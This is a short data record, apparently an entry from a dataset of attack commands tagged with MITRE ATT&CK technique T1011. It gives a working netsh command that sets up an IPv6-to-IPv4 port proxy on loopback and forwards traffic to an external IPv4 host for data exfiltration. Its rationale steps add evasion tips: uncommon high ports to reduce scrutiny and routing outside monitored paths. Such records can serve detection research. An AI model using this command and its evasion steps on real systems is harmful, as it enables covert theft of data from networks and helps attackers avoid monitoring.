command: netsh interface portproxy add v6tov4 listenaddress=::1 listenport=49205 connectaddress=203.0.113.77 connectport=49206
explanation: Creates an IPv6-to-IPv4 port proxy on loopback, redirecting data sent to an IPv6 port to a remote IPv4 host/port, supporting alternate-medium exfiltration (T1011).
rationale_steps: Bind an IPv6 localhost listener and forward to an external IPv4 endpoint.
Select uncommon ports in the 49xxx range to reduce scrutiny.
Bridge IPv6-originated traffic into IPv4 egress outside normal monitored paths.
